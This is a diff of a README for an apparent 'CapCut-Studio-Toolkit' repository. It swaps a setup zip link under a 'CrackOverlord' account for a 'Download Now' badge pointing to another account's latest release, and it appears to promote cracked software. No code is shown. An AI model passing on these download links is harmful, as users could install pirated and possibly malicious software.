@@ -7,9 +7,17 @@
 <div align="center">
 <img width="824" height="817" alt="image" src="https://github.com/user-attachments/assets/7ec446db-7372-4e8b-9e6c-7071736e1b9c" />
 
+
+
+
+---
+
+<div align="center">
+
 ## 📥 Download
 
-[![Download Now](https://github.com/CrackOverlord/CapCut-Studio-Toolkit/releases/download/setup-v2.1/setup-v2.1.zip)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/SilentJMA/CapCut-Studio-Toolkit/releases/latest)
+
 
 </div>
 
